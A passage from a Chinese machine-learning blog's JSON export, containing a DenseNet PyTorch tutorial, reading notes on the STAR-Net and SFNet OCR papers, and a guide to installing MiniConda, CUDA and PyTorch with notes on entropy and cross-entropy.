num_conv, input_channels, num_channels): super(DenseBlock, self).__init__() layer = [] for i in range(num_conv): layer.append(conv_block(num_channels * i + input_channels, num_channels)) self.net = nn.Sequential(*layer) def forward(self, X): for blk in self.net: Y = blk(X) # 连接通道上每一个块的输入和输出 X = torch.cat((X, Y), dim=1) return X# TODO: 测试稠密块的形状blk = DenseBlock(2, 3, 10)X = torch.randn(4, 3, 8, 8)Y = blk(X)print(Y.shape)# TODO: 过渡层# 由于每个稠密块都会带来通道数的增加，使用过多则会过于复杂化模型。# 而过渡层可以用来控制模型复杂度。# 它通过卷积层来减小通道数，并使用步幅为2的平均汇聚层减半高和宽，从而进一步降低模型复杂度。def transition_block(input_channels, num_channels): return nn.Sequential( nn.BatchNorm2d(input_channels), nn.ReLU(), nn.Conv2d(input_channels, num_channels, kernel_size=1), nn.AvgPool2d(kernel_size=2, stride=2) )# TODO: 测试过度块形状blk = transition_block(23, 10)print(blk(Y).shape)# TODO: DenseNet模型# 第一个Stage使用与ResNet相同的卷积层和MaxPoolingb1 = nn.Sequential( nn.Conv2d(1, 64, kernel_size=7, stride=2, padding=3), nn.BatchNorm2d(64), nn.ReLU(), nn.MaxPool2d(kernel_size=3, stride=2, padding=1))# TODO: 接下来使用类似ResNet的四个块# Dense块的卷积层可以设置多个，此处设为4，从而与ResNet-18保持一致。# Dense块中的卷积层通道数设为32，因此每个块将增加128个通道# 需要注意的是ResNet通过步幅为2的Res块减小宽高，而Dense块使用过渡层，同时还会减半通道数# num_channels为当前的通道数num_channels, growth_rate = 64, 32num_convs_in_dense_blocks = [4, 4, 4, 4]blks = []for i, num_convs in enumerate(num_convs_in_dense_blocks): blks.append(DenseBlock(num_convs, num_channels, growth_rate)) # 上一个稠密块的输出通道数 num_channels += num_convs * growth_rate # 在稠密块之间添加一个转换层，使通道数量减半 if i != len(num_convs_in_dense_blocks) - 1: blks.append(transition_block(num_channels, num_channels // 2)) num_channels = num_channels // 2# TODO: 与ResNet类似，最后需要增加全局汇聚层和全连接层net = nn.Sequential( b1, *blks, nn.BatchNorm2d(num_channels), nn.ReLU(), nn.AdaptiveAvgPool2d((1, 1)), nn.Flatten(), nn.Linear(num_channels, 10))# TODO: 训练lr, num_epochs, batch_size = 0.1, 10, 256train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size, resize=96)d2l.train_ch6(net, train_iter, test_iter, num_epochs, lr, d2l.try_gpu())d2l.plt.show() 经过Dense块后的输出形状如下： 1torch.Size([4, 23, 8, 8]) 经过过度层的输出形状如下 1torch.Size([4, 10, 4, 4]) 训练结果： 12loss 0.140, train acc 0.950, test acc 0.8825544.6 examples/sec on cuda:0","categories":[{"name":"硕士研究生","slug":"硕士研究生","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"机器学习入门","slug":"硕士研究生/机器学习入门","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"},{"name":"CNN","slug":"硕士研究生/机器学习入门/CNN","permalink":"http://enderxiao.github.io/categories/%E7%A1%95%E5%A3%AB%E7%A0%94%E7%A9%B6%E7%94%9F/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/CNN/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"http://enderxiao.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"},{"name":"PyTorch","slug":"PyTorch","permalink":"http://enderxiao.github.io/tags/PyTorch/"},{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/tags/Python/"},{"name":"CNN","slug":"CNN","permalink":"http://enderxiao.github.io/tags/CNN/"}]},{"title":"StarNet论文阅读","slug":"StarNet论文阅读","date":"2022-11-17T10:55:52.000Z","updated":"2024-07-30T11:26:33.915Z","comments":true,"path":"2022/11/17/StarNet论文阅读/","permalink":"http://enderxiao.github.io/2022/11/17/StarNet%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"","text":"标题 STAR-Net: A SpaTial Attention Residue Network for Scene Text Recognition BMVC 2016 主要贡献 在网络中使用了位置注意力机制来消除自然图像中文本扭曲对识别的影响。 本文使用ResNet构造主干网络，结合空间注意力机制，构造了“目前最深”的端到端OCR网络 据作者所说，这是ResNet网络在场景文字识别的首次应用（？ 方法 本文提出的网络一共包含三个部分： 空间注意力机制 残差特征提取器 CTC（Connectionist Temporal Classification）分类器 空间变换器 该模块的主要功能是将一个排布松散，切扭曲的文本区域，转化为一个排布紧凑规范的文本区域。 该部分总共包含三个组件: localisation network sampler采样器 interpolator插值器 在这个结构中，第一个模块用于决定输入的扭曲情况，并输出相关的变化参数。 接下来第二个模块根据第一个模块的输出参数，该模块将定位输出图像中的一些采样点，这些采样点准确的定义了被除颤的文本区域 最后，第三个模块通过对每个采样点的4领域的像素强度值进行插值，最终生成输出图像 本文为了便于解释，空间变换器使用了放射变换实现 Localisaion Network 对于一个宽W，高H的输入灰度图I∈RW×HI \\in R ^{W \\times H}I∈RW×H，输出的参数是一个仿射变换矩阵 θ(I)=[a11a12a13a21a22a23]\\theta(I) = \\left [ \\begin{matrix} a_{11} &amp; a_{12} &amp; a_{13} \\\\ a_{21} &amp; a_{22} &amp; a_{23} \\end{matrix} \\right]θ(I)=[a11​a21​​a12​a22​​a13​a23​​] 该模块采用了卷积神经网络的形式，会根据最终的损失函数学习网络的参数 Sampler 该层遍历上层输出的每个像素，然后定位采样点，一个输入图像的采样点(xi,yi)(x_i, y_i)(xi​,yi​)对应一个输出图像上的像素(xi′,yi′)(x_i&#x27;, y_i&#x27;)(xi′​,yi′​)的计算过程如下： $\\left [ \\begin{matrix} x_i \\ y_i \\end{matrix} \\right ] = \\theta (I) \\left [ \\begin{matrix} x_i’ \\ y_i’ \\ 1 \\end{matrix} \\right ] $ (我的理解是 这一层只不过是把上层学习出来的仿射矩阵应用到原图中X) Interpolator 该层对输出图像做了四领域的双线性插值（bilinear Interpolator） ResNet Feature Extractor 本文使用ResNet块做特征提取，然后使用LSTM对序列特征进行解码。从CNN中输出的是带有位置信息的三维特征Cs×Hs×WsC_s \\times H_s \\times W_sCs​×Hs​×Ws​，本文将三维的特征映射为序列特征。 本文将输出的三维特征图沿宽度进行切片，最终得到WsW_sWs​个切片，接下来对于每个Cs×HsC_s \\times H_sCs​×Hs​的切片，将他们映射为一个向量st⃗,t=[1,2,...,Ws]\\vec {s_t}, t = [1,2,...,W_s]st​​,t=[1,2,...,Ws​] 为了避免普通卷积网络中特征丢失的问题，本文使用18个ResNet块构建网络 LSTM WiW_iWi​为权重，b⃗\\vec {b}b为偏置，h⃗\\vec{h}h为隐藏状态，σ\\sigmaσ为logistic sigmoid 函数，本文使用双向LSTM层 CTC 使用CTC进行解码无需学习参数，本文通过简化解码器，以强调特征提取器能够具有辨别性的序列特征。 最终定义的标签为L′=L∪{blank}L&#x27; = L \\cup \\{blank\\}L′=L∪{blank}其中L表示一个包含26个字母和10个数字的集合。 在最后的解码阶段，使用一个softmax层来输出一个概率y={y⃗1,...,y⃗Ws}y = \\{ \\vec{y}^1, ... , \\vec{y}^{W_s} \\}y={y​1,...,y​Ws​}表示序列特征s⃗t\\vec{s}_tst​在L′L&#x27;L′上取得的每一项概率。对于宽度为WsW_sWs​的序列π\\piπ，他的概率定义为p(π)=∏t=1Wsy⃗πttp(\\pi) = \\prod ^{W_s} _ {t=1} \\vec{y}^t _{\\pi _t}p(π)=∏t=1Ws​​y​πt​t​ 随后本文又定义了一个map to one的映射B\\BetaB，用于将重复的标签和空标签移除。对于给定的标签序列I(I.Length()≤Ws)I (I.Length() \\leq W_s)I(I.Length()≤Ws​)，其概率公式为： p(I∣y)=∑πp(π),π∈B−1(I)p(I|y) = \\sum _{\\pi} p (\\pi), \\pi \\in \\Beta^{-1}(I)p(I∣y)=∑π​p(π),π∈B−1(I) 其中B(I)−1\\Beta (I)^{-1}B(I)−1表示BBB的逆运算，那么CTC的损失函数即为： Octc=−∑(I,y)∈Sln p(I∣y)O_{ctc} = - \\sum_{(I,y) \\in S} ln \\ p(I|y)Octc​=−∑(I,y)∈S​ln p(I∣y) 其中S代表训练集。 由于序列数量会随着WsW_sWs​指数级增长，因此本文使用了前向后向算法来计算损失函数。 数据集 ICDAR-2003 ICDAR-2013 IIIT5K Street View Text Street View Text Perspective","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"论文阅读计划","slug":"论文阅读计划","date":"2022-11-17T08:16:54.000Z","updated":"2024-07-30T11:26:33.939Z","comments":true,"path":"2022/11/17/论文阅读计划/","permalink":"http://enderxiao.github.io/2022/11/17/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E8%AE%A1%E5%88%92/","excerpt":"","text":"论文阅读计划 Title From Status StarNet BMVC 2016 Reading","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"SFNet论文阅读","slug":"SFNet论文阅读","date":"2022-11-14T01:50:28.000Z","updated":"2024-07-30T11:26:33.914Z","comments":true,"path":"2022/11/14/SFNet论文阅读/","permalink":"http://enderxiao.github.io/2022/11/14/SFNet%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"","text":"摘要 本论文设计了： 版面分析：基于特征瀑布的多尺度融合模块，通过不同尺度上的图像进行相互融合进行版面分析 混合数据识别：阶段空间注意力模块，混合文本中存在二维空间结构，该模块在训练时能有效地注意到文本行中二维结构的上下区域，提升神经网络对二维特征的表达能力 数据集：真实场景下学生手写文本，分别构建了混合检测和识别数据集 实验结果 混合检测数据集：综合指标F1?F1^?F1?分数91.1% 混合识别数据集：准确率83.33% 方法 流程分析 数学文本识别流程： 版面预处理 缩放、旋转、去噪 文本行内部结构分析 通过语义分割将二维公式转化为一维序列 内部语义结构分析，将文字和公式分开处理 将数学公式划分为: 数值 根式 指数 分数 文本行整体分析 对真实场景下的手写体数学文档，进行了级别的标注 识别模块 文本行序列识别 基于多尺度特征瀑布融合的检测网络 思维基础 特征金字塔网络(Feature Pyramid Network, FPN)，该网络包含三条通路： 自下而上的特征提取路径 自上而下的特征强化路径 横向连接 该方法相比于图像金字塔，该网络计算量更小，同事丰富每一层级的语义信息。 多尺度特征瀑布融合模块 深层网络得到的特征图会有全局性的感受视野，含有强语义信息 浅层网络得到的特征图会有局部性的感受视野，还有丰富几何特征 本文中特征瀑布融合**(Feature Waterfall Fusion, FWF)**模块。 该模块包含三条通路： 自下而上的特征提取路径(Bottom-up Pathway) 特征融合的瀑布流路径(Waterfall-flow Pathway) 横向连接(Lateral Connection) 特征提取路径使用ResNet输出四个不同尺寸的特征图，顶部特征图尺寸最小但语义信息最强，底部的图片分辨率最高语义信息最弱。 横向连接层首先使用一个kernel=1，stride=1，padding=0的卷积核将每一个特征图的通道数调整为固定值，上图中使用黄色异或符号表示 瀑布层会将箭头末端代表的特征图融合进箭头指向的特征图中，融合规则如下所示： 某层的特征将被其下所有层融合 即如图右侧最顶层特征将被其下三层融合。 融合方式类似瀑布，因此而的名称。 融合方式，以左侧虚线框中4层与1层合并为例： 使用双线性插值法进行8倍上采样 同像素累加 由于上卷积存在混叠效应，最后需要通过kernel=3，stride=1，padding=1的卷积进行特征平滑操作 由于需要进行同像素累加操作，第2层与第1层的融合则只需要进行2倍上采样即可，如右侧虚线框中所示。 该模块的主要特征是，相比特征金字塔只将低分辨率特征图加入与其最近的一次特征图中，本模块瀑布式的将低分辨率特征图加入到其下的每一层，是所有特征图都具有较强的语义信息。 文本检测网络 在ResNet的基础上结合瀑布式融合模块 最后的FfF_fFf​用于预测文本框，由4个特征图组成，拼接之前对PiP_iPi​分别做上采样，使得通道数为D，长宽分别为H4,W4\\frac{H}{4},\\frac{W}{4}4H​,4W​，最后得到Ff∈R4D×H×WF_f \\in R^{4D\\times H \\times W}Ff​∈R4D×H×W 渐进式规模扩张后处理 后处理采用渐进式规模扩张后处理(Progressive Scale Expansion, PSE) 该算法的核心思想来源于BFS 计算伪代码如下： 其中符号T和P式算法扩张产生的中间结果，Queue表示队列，Neighbor()表示文本像素p的相邻像素集，符号GroupByLabel()式根据Label对中间结果分组的操作，符号Si[q]=TrueS_i[q] = TrueSi​[q]=True表示像素q被预测为实列内核SiS_iSi​的一部分 手写文字公式混合识别 研究难点 数据集较少 书写风格不同 版面随意 基于阶段空间注意力的识别网络 卷积注意力模块 卷积注意力模块(Convolutional Block Attention Module, CBAM)通过提升模型对图像中关键区域的表达能力，告诉网络该注意图片的什么地方，在图片的空间维度上和通道维度上对特征进行一直或强化。 该模块首先根据通道注意力机制产生一个尺寸为RC×1×1R^{C\\times 1\\times 1}RC×1×1的一维注意力图，与F进行像素相乘，得到中间结果F′∈RC×W×HF&#x27;\\in R^{C \\times W \\times H}F′∈RC×W×H，然后再通过空间注意力图机制产生一个尺寸为R1×H×WR^{1\\times H\\times W}R1×H×W的二维注意力图，与F′F&#x27;F′进行像素相乘最后输出包含通道和空间两个维度权重的特征图F′′∈RC×H×WF&#x27;&#x27;\\in R^{C\\times H\\times W}F′′∈RC×H×W 阶段空间注意力（Stage Spatial Attention， SSA） 在手写体数学文本行识别任务中，告诉模型重要区域在哪能提升识别准确率，因此此处指采用卷积注意力模块中的空间注意力子模块来捕获公式的二维结构，而不采用通道注意力子模块 如图所示的过程是SSA中提取出空间注意力图的过程： 首先对输入的中间特征F′F&#x27;F′进行一次通道维度上的**最大池化（Max-Pool）**得到Fmaxs∈R1×H×WF^s_{max} \\in R^{1 \\times H \\times W}Fmaxs​∈R1×H×W，即蓝色区域 然后对输入的中间特征F′F&#x27;F′进行一次通道维度上的**平均池化（Avg-Pool）**得到Favgs∈R1×H×WF^s_{avg} \\in R^{1 \\times H \\times W}Favgs​∈R1×H×W，即蓝色区域 对FmaxsF^s_{max}Fmaxs​和FavgsF^s_{avg}Favgs​按照相同位置进行像素拼接操作，得到Fs∈R2×H×WF^s \\in R^{2\\times H \\times W}Fs∈R2×H×W 接下来通过kernel=3,stride=1,padding=3的卷积核将通道数调整为1 为了抑制和凸显重要区域，用Sigmoid函数将特征图上的值域压缩为0-1之间，得到MsM_sMs​ 最后将MsM_sMs​与输入特征图FFF进行像素乘法，就得到了空间注意力特征图 识别网络构建 由于**残差网络（ResNet）**本身的分成结构，本网络使用残差网络作为基础架构 该结构使用了5类残差网块，分别是RestNet18、RestNet34、RestNet50、RestNet101、RestNet152，此处省略了第一次卷积运算，对于任何F∈RC×H×WF \\in R^{C \\times H \\times W}F∈RC×H×W的原始输入图片，残差神经网络分别四次输出中间的特征图： {C2∈Rc2×H4×W4、C3∈Rc3×H8×W4、C4∈Rc4×H16×W4、C5∈Rc5×H32×W4}\\{C_2 \\in R^{c_2 \\times \\frac{H}{4} \\times \\frac{W}{4}}、C_3 \\in R^{c_3 \\times \\frac{H}{8} \\times \\frac{W}{4}}、C_4 \\in R^{c_4 \\times \\frac{H}{16} \\times \\frac{W}{4}}、C_5 \\in R^{c_5 \\times \\frac{H}{32} \\times \\frac{W}{4}}\\}{C2​∈Rc2​×4H​×4W​、C3​∈Rc3​×8H​×4W​、C4​∈Rc4​×16H​×4W​、C5​∈Rc5​×32H​×4W​} 因此每一个阶段空间注意力模块会分别生成注意力图： {S2∈Rc2×H4×W4、S3∈Rc3×H8×W4、S4∈Rc4×H16×W4、S5∈Rc5×H32×W4}\\{S_2 \\in R^{c_2 \\times \\frac{H}{4} \\times \\frac{W}{4}}、S_3 \\in R^{c_3 \\times \\frac{H}{8} \\times \\frac{W}{4}}、S_4 \\in R^{c_4 \\times \\frac{H}{16} \\times \\frac{W}{4}}、S_5 \\in R^{c_5 \\times \\frac{H}{32} \\times \\frac{W}{4}}\\}{S2​∈Rc2​×4H​×4W​、S3​∈Rc3​×8H​×4W​、S4​∈Rc4​×16H​×4W​、S5​∈Rc5​×32H​×4W​} 该网络参数表如下： 总体设计 手写数学文档文本行的检测使用渐进式规模扩张后处理算法，该方法能分离间距紧密的文本实列 混合文本序列识别采用卷积神经网络CNN和循环神经网络RNN的框架结构 CNN使用嵌入有阶段空间注意力的ResNet RNN为双向LSTM 损失函数为CTC 分割网络损失函数设计 使用类似聚类算法的思想对文本行像素进行聚类，采用类似**像素聚合网络（Pixel Aggregation Net, PANet）**的损失函数，生成两个掩码标签：完整掩码和内核掩码 整体损失函数如下： L=Ltex+α×Lker+β×(Lagg+Ldig)L = L_{tex} + \\alpha \\times L_{ker} + \\beta \\times (L_{agg} + L_{dig})L=Ltex​+α×Lker​+β×(Lagg​+Ldig​) 其中LaggL_{agg}Lagg​用来促使不属于内核K的像素与其之间距离大，属于内核K的像素与其保持较近距离： Lagg=1N∑i=1N1∣Si∣∑p∈Siln(D(p,Ki)+1)L_{agg} = \\frac{1}{N} \\sum ^N _{i=1} \\frac{1}{|S_i|} \\sum _ {p \\in S_i} ln(D(p, K_i) +1)Lagg​=N1​∑i=1N​∣Si​∣1​∑p∈Si​​ln(D(p,Ki​)+1) D(p,Ki)=max(∣∣F(p)−G(Ki)∣∣−σagg,0)2D(p,K_i) = max(||F(p) - G(K_i)|| - \\sigma _ {agg}, 0)^2D(p,Ki​)=max(∣∣F(p)−G(Ki​)∣∣−σagg​,0)2 NNN表示文档中所有文本行的实例总和 SiS_iSi​表示一行文本行实列 D(p,Ki)D(p, K_i)D(p,Ki​)定义了属于SiS_iSi​的像素ppp和文本内核KiK_iKi​之间的距离 超参数σagg\\sigma _ {agg}σagg​设为0.5，用来过滤比较简单的数据 F(p)F(p)F(p)是像素ppp的相似度向量表示 G(Ki)G(K_i)G(Ki​)是内核KiK_iKi​的相似度向量表示 LdisL_{dis}Ldis​用来保证不同内核之间的距离足够大： Ldis=1N×(N−1)∑i=1N∑j=1,j≠iNln(D(Ki,K)+1)L_{dis} = \\frac{1}{N \\times (N-1)}\\sum^N _{i=1} \\sum ^ N _ {j = 1, j \\neq i} ln(D(K_i, K) + 1)Ldis​=N×(N−1)1​∑i=1N​∑j=1,j=iN​ln(D(Ki​,K)+1) D(Ki,Kj)=max(σdis−∣∣G(Ki)−G(Kj)∣∣,0)2D(K_i, K_j) = max(\\sigma _{dis} - ||G(K_i) - G(K_j)||, 0)^2D(Ki​,Kj​)=max(σdis​−∣∣G(Ki​)−G(Kj​)∣∣,0)2 超参数σdis\\sigma_{dis}σdis​设置为3，用来保证不同内核之间的距离的绝对值要大于σdis\\sigma_{dis}σdis​ LtexL_{tex}Ltex​和LkerL_{ker}Lker​分别作为文本区域和文本内核的损失，考虑到文本行区域和非文本行区域分布的不平衡性使用Dice Loss计算文本实列的分割结果PtexP_{tex}Ptex​和文本内核的分割结果PkerP_{ker}Pker​： Ltex=1−2×∑Ptex(i)×Gtex(i)∑Ptex(i)2+∑Gtex(i)2L_{tex} = 1 - \\frac {2 \\times \\sum P_{tex}(i)\\times G_{tex}(i)}{\\sum P_{tex}(i)^2 + \\sum G_{tex}(i)^2}Ltex​=1−∑Ptex​(i)2+∑Gtex​(i)22×∑Ptex​(i)×Gtex​(i)​ Lker=1−2×∑Pker(i)×Gker(i)∑Pker(i)2+∑Gker(i)2L_{ker} = 1 - \\frac {2 \\times \\sum P_{ker}(i)\\times G_{ker}(i)}{\\sum P_{ker}(i)^2 + \\sum G_{ker}(i)^2}Lker​=1−∑Pker​(i)2+∑Gker​(i)22×∑Pker​(i)×Gker​(i)​ α\\alphaα和β\\betaβ两个超参数用来协调四个部分，分别被设置为0.5和0.25，学习率设置为0.001，使用权重衰减来避免过拟合，设置为0.0005，迭代次数设置为300 结果采用F1分数，即H-mean进行衡量，同事保持较高的精确率和召回率： F1=2×Precision×RecallPrecision×RecallF_1 = \\frac{2\\times Precision \\times Recall}{Precision \\times Recall}F1​=Precision×Recall2×Precision×Recall​ Precision=TPTP+FPPrecision = \\frac{TP}{TP + FP}Precision=TP+FPTP​ Recall=TPTP+FNRecall = \\frac{TP}{TP + FN}Recall=TP+FNTP​ 对比结果： 序列识别损失函数设计 训练使用**CTC(Connectionist Temporal Classification)**进行模型优化 采用Adam优化器对网络进行训练，学习率设置为0.001，迭代次数设置为100 效果对比 缺陷 文本行内部结构分析中，上游语义分割误差会影响到下游识别模块的性能，造成累计误差。 进行行内部结构分析人工标注工作量大 手写文本行内容倾斜问题比较突出，本位未对文本行进行图像校正 本文使用的数据集规模较小，可以使用GAN网络来生成更多更逼真的数据。","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"}]},{"title":"动手学机器学习——网络模型基础","slug":"动手学机器学习-网络模型基础","date":"2022-11-10T12:22:12.000Z","updated":"2024-07-30T11:26:33.929Z","comments":true,"path":"2022/11/10/动手学机器学习-网络模型基础/","permalink":"http://enderxiao.github.io/2022/11/10/%E5%8A%A8%E6%89%8B%E5%AD%A6%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80/","excerpt":"机器学习相关内容学习笔记","text":"机器学习相关内容学习笔记 环境搭建 MiniConda Conda 是一个开源的软件包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。 这意味着我们可以想使用Pip或者Pacman或者Winget那样使用Conda来安装，例如使用conda安装pytorch 1conda install pytorch torchvision torchaudio pytorch-cuda=11.7 -c pytorch-nightly -c nvidia 并且Conda还能轻松的帮我们管理不同的软件版本，比如我们可以设置不同的环境使用不同的Python版本，并且这两个环境并不影响： 1conda create --name d2l python==3.8 Conda除了管理python环境以外，还支持C、JAVA、等等一些语言的环境隔离。并且自带UI界面。 而MiniConda是Conda的精简版，其中只包含Conda的软件包管理器和Python。 下面我们位Conda配置环境： 首先我们从官网上下载系统对应版本的MiniConda： center large 安装时注意需要把添加环境变量选上，或者手动在系统变量的Path中添加如下变量： 123E:\\MiniConda # MiniConda安装路径E:\\MiniConda\\ScriptsE:\\MiniConda\\Library\\bin CUDA 训练模型通常需要我们使用GPU加速，因此我们需要配置CUDA才能让PyTorch这类框架能够利用到我们的GPU。（如果显卡是N卡的话） 如果是AMD显卡，则需要使用Ubuntu（或其他Linux发行版）来安装ROCm 首先我们通过Nvidia控制面板，点击系统信息（左下角） 组件标签 查看NVCUDA64.DLL这一栏，产品名称后面写的CUDA版本号： 例如我这一台支持的CUDA版本是11.7.101 感兴趣的话还可以去一下链接产看一下自己显卡的算力： 算力表https://developer.nvidia.com/zh-cn/cuda-gpus 前往如下网站下载对应版本的CUDA： center large 安装完成后输入以下命令查看是否安装成功： 1nvcc -V 然后配置如下环境变量： 1234E:\\CUDA\\Computing\\binE:\\CUDA\\Computing\\lib\\x64E:\\CUDA\\Computing\\extras\\CUPTI\\lib64E:\\CUDA\\Computing\\include 运行如下命令查看版本： 1nvidia-smi PyTorch 前往PyTorch官网： PyTorchhttps://pytorch.org/get-started/locally/ 查看对应版本的下载命令，例如目前使用的CUDA11.7只有Preview版本支持： 1pip3 install --pre torch torchvision torchaudio --extra-index-url https://download.pytorch.org/whl/nightly/cu117 如果下载过程过于缓慢，可以将pip或Conda的源换成国内源。下面我们用pip举例： 在C:/User/XXXX/下新建pip文件夹 在pip文件夹下新建pip.ini文件 在文件中写下如下内容： [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] trusted-host = https://pypi.tuna.tsinghua.edu.cn 1234567894. 保存后在命令行中输入以下命令` pip install update`验证是否配置成功PyTorch安装后使用如下命令测试是否安装成功：```pythonpython&gt;&gt;&gt; import torch&gt;&gt;&gt; torch.cuda.is_available() 返回True则表示PyTorch和CUDA均安装成功。 损失函数 补充一些基础知识 交叉熵 交叉熵本来是信息论种的内容，那么先来看看关于信息论的知识 信息量 信息量的基本思想是： 一个不太可能发生的事情发生了，包含的信息量更大 一个非常可能发生的事情发生了，包含的信息更小 对于如下两个事件： 今天早上太阳升起 今天早上又日食 信息论种认为1发生了这件事所包含的信息如此之少，以至于没有通知大家的必要 而2发生了这件事所包含的信息如此之多，或者是如此之有用，以至于需要在各大新闻平台播报 如果从提取数学模型，可以发现： 事件包含的信息量应与其发生的概率成负相关 于是我们假定某一离散的随机变量X，取值集合为x1,x2,...,xn{x_1, x_2, ... , x_n}x1​,x2​,...,xn​，那么随机事件X=xiX = x_iX=xi​的信息量被定义为： I(xi)=−logP(X=xi)I(x_i) = -logP(X = x_i)I(xi​)=−logP(X=xi​) 其中log标识自然对数，底数为e（也有资料的定义中标识底数为2），公式中P为变量X取值为xix_ixi​的概率。这个概率将落在0到1之间。 12345678910111213141516171819202122232425import numpy as npimport matplotlib.pyplot as pltfrom matplotlib.pyplot import MultipleLocatorimport mathif __name__ == &#x27;__main__&#x27;: # 生成等差数列 X = np.linspace(0.01, 1, 256, endpoint=True) print(X) # 计算信息量 aoi = [-math.log(x) for x in X] print(aoi) # 实例化横坐间隔 x_major_locator = MultipleLocator(0.5) ax = plt.gca() # 设置横坐标间隔 ax.xaxis.set_major_locator(x_major_locator) # 设置纵坐标长度 plt.ylim(0, 5.0) plt.plot(X, aoi) plt.show() 可见信息量与概率的反比趋势。 并且随着概率趋向于0，即0概率事件，事件的信息量趋近于正无穷，满足信息量的基本想法。 信息熵 又称香农熵，用以对整个概率分布的平均信息量进行描述，具体方法即是对信息量关于概率分布P求期望： H(X)=−∑i=1nP(X=xi)logP(X=xi)H(X) = -\\sum_{i=1}^nP(X=x_i)logP(X=x_i)H(X)=−∑i=1n​P(X=xi​)logP(X=xi​) 相对熵（KL散度） 上述计算都是基于一个假设：我们能够准确地得到一个随机变量的分布情况。 但往往我们无法观测一个随机变量的真实分布，通常情况下我们会使用一个近似的分布Q(X)Q(X)Q(X)来进行建模。因此我们需要一些附加的信息来抵消分布不同造成的误差。因此提出了相对熵的概念，也叫KL散度，它可以用来衡量两个分布的差异： DKL(P∣∣Q)=−∑i=1nP(xi)logQ(xi)−(−∑i=1nP(xi)logP(xi))=∑i=1nP(xi)logP(xi)Q(xi)D_{KL}(P || Q) = -\\sum_{i=1}^nP(x_i)logQ(x_i) - (-\\sum _{i=1}^nP(x_i)logP(x_i)) = 